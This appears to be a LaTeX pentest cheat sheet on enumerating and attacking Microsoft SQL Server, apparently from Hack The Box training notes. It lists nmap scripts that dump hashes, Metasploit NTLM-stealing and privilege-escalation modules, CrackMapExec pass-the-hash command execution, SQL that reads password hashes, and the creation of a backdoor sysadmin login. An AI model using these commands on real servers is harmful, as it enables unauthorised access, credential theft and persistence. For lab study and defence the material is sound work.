
\section{Footprint / enumeration}

\subsection{nmap}
\begin{verbatim}
jubeaz@htb[/htb]$ sudo nmap --script \
    ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,\
    ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,\
    ms-sql-dump-hashes \
    --script-args \
        mssql.instance-port=1433,mssql.username=sa,\
        mssql.password=,mssql.instance-name=MSSQLSERVER
    -sV -p 1433
\end{verbatim}

\subsection{metasploit}
\begin{verbatim}
use scanner/mssql/mssql_ping
\end{verbatim}

\section{Interaction}

\subsection{sqsh}
Sqsh is much more than a friendly prompt. It is intended to provide much of the
functionality provided by a command shell, such as variables, aliasing,
redirection, pipes, back-grounding, job control, history, command substitution,
and dynamic configuration. 

\begin{verbatim}
sqsh -S IP -U LOGIN -P PASSWORD
\end{verbatim}


\subsection{sqlcmd}

Windows sqlcmd allow to enter ransact-SQL statements, system procedures, and script files through a variety of available modes:
\begin{itemize}
    \item  At the command prompt.
    \item  In Query Editor in SQLCMD mode.
    \item  In a Windows script file.
    \item  In an operating system (Cmd.exe) job step of a SQL Server Agent job.
\end{itemize}

\subsection{dbeaver}

\subsection{Metasploit}

\begin{verbatim}
use auxiliary/admin/mssql/mssql_ntlm_stealer
use auxiliary/admin/mssql/mssql_escalate_dbowner
auxiliary/admin/mssql/mssql_escalate_execute_as
\end{verbatim}


\subsection{CrackMapExec}
\begin{verbatim}
#Username + Password + CMD command
crackmapexec mssql -d <Domain name> -u <username> -p <password> -x "whoami"
#Username + Hash + PS command
crackmapexec mssql -d <Domain name> -u <username> -H <HASH> -X '$PSVersionTable'
\end{verbatim}


\subsection{SQL commands}
\begin{verbatim}
SELECT name FROM master.dbo.sysdatabases #Get databases
SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES; #Get table names

#List Linked Servers
EXEC sp_linkedservers
SELECT * FROM sys.servers;

#List users
select sp.name as login, sp.type_desc as login_type, sl.password_hash, 
    sp.create_date, sp.modify_date, 
    case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status 
from sys.server_principals sp left join sys.sql_logins sl 
    on sp.principal_id = sl.principal_id 
where sp.type not in ('G', 'R') order by sp.name;

#Create user with sysadmin privs
CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
sp_addsrvrolemember 'hacker', 'sysadmin'
\end{verbatim}

